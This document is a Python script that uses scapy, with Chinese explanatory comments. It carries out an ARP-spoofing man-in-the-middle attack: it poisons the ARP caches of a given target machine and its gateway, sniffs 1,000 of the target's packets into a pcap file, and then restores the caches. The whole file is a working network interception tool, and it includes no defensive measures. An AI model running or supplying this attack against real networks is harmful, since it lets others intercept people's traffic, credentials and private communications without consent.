#!/usr/bin/python
#-*- coding:utf-8 -*-
#scapy进行arp欺骗，嗅探流量

from scapy.all import *
import os
import sys
import threading

interface    = "wlan0"
target_ip    = sys.argv[1]
gateway_ip   = sys.argv[2]
packet_count = 1000
poisoning    = True

#还原路由器、靶机arp缓存表
def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):

    # slightly different method using send
    print "[*] Restoring target..."
    #发送arp报文，类型2为响应报文
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
#获取mac地址
def get_mac(ip_address):
    #srp发送报文并接收响应，类型1为arp请求报文
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)

    # return the MAC address from a response
    for s,r in responses:
        #返回链路层的来源地址
        return r[Ether].src

    return None
#arp投毒
def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    global poisoning
    #构造arp报文
    poison_target = ARP()
    poison_target.op   = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst= target_mac
    #分别欺骗网关、靶机
    poison_gateway = ARP()
    poison_gateway.op   = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac

    print "[*] Beginning the ARP poison. [CTRL-C to stop]"
    #循环发送报文，投毒arp缓存表
    while poisoning:
        send(poison_target)
        send(poison_gateway)

        time.sleep(2)

    print "[*] ARP poison attack finished."

    return
#设置网卡
# set our interface
conf.iface = interface
#关闭输出
# turn off output
conf.verb  = 0

print "[*] Setting up %s" % interface

#获取网关、靶机mac地址
gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print "[!!!] Failed to get gateway MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)

target_mac = get_mac(target_ip)
if target_mac is None:
    print "[!!!] Failed to get target MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Target %s is at %s" % (target_ip,target_mac)

#子线程开启投毒诉
# start poison thread
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac,target_ip,target_mac))
poison_thread.start()

#主线程抓包
try:
    print "[*] Starting sniffer for %d packets" % packet_count

    bpf_filter  = "ip host %s" % target_ip
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
    #无回调函数则返回数据包对象
except KeyboardInterrupt:
    pass

finally:
    # write out the captured packets
    print "[*] Writing packets to arper.pcap"
    wrpcap('arper.pcap',packets)
    #保存数据包
    poisoning = False
    #设置poisoning，使子线程停止投毒

    # wait for poisoning thread to exit
    time.sleep(2)
    #还原arp缓存表
    # restore the network
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)
